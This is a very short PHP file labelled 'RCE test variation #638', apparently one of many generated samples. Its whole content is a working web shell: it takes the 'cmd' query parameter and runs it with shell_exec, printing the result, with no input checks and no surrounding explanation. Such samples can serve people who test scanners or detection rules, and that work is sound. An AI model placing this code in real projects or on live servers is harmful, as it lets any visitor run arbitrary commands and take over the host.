<?php
// RCE test variation #638
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>